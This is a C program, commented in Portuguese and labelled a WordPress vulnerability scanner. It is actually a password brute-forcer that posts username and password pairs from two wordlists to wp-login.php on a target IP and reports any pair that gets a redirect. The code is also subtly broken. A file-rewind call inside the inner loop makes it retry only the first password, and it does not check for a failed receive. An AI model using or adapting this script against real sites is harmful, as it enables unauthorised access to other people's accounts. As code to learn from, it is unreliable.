#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

//Scanner para vulnerabilidades em WordPress

#define BUFFER_SIZE 2048

void check_vulnerability(const char *url, const char *username, const char *password) {
    int sock;
    struct sockaddr_in server;
    char request[BUFFER_SIZE];
    char response[BUFFER_SIZE];

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("Socket");
        return;
    }

    server.sin_family = AF_INET;
    server.sin_port = htons(80);
    inet_pton(AF_INET, url, &server.sin_addr);

    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        perror("Connect");
        close(sock);
        return;
    }

    snprintf(request, sizeof(request), "POST /wp-login.php HTTP/1.1\r\n"
                                       "Host: %s\r\n"
                                       "Content-Type: application/x-www-form-urlencoded\r\n"
                                       "Content-Length: %lu\r\n\r\n"
                                       "log=%s&pwd=%s&wp-submit=Log+In",
             url, strlen(username) + strlen(password) + 26, username, password);

    send(sock, request, strlen(request), 0);
    int bytes_received = recv(sock, response, sizeof(response) - 1, 0);
    response[bytes_received] = '\0';

    if (strstr(response, "Location:") != NULL) {
        printf("Found valid credentials: %s / %s\n", username, password);
    }

    close(sock);
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        printf("Uso: %s <IP do servidor> <arquivo de usuarios> <arquivo de senhas>\n", argv[0]);
        return 1;
    }

    const char *url = argv[1];
    const char *user_file_path = argv[2];
    const char *pass_file_path = argv[3];

    FILE *user_file = fopen(user_file_path, "r");
    FILE *pass_file = fopen(pass_file_path, "r");

    if (!user_file || !pass_file) {
        perror("fopen");
        return 1;
    }

    char username[100];
    char password[100];

    while (fgets(username, sizeof(username), user_file)) {
        username[strcspn(username, "\n")] = 0; // Remove newline
        while (fgets(password, sizeof(password), pass_file)) {
            password[strcspn(password, "\n")] = 0; // Remove newline
            check_vulnerability(url, username, password);
            fseek(pass_file, 0, SEEK_SET); // Reset password file pointer
        }
    }

    fclose(user_file);
    fclose(pass_file);
    return 0;
}
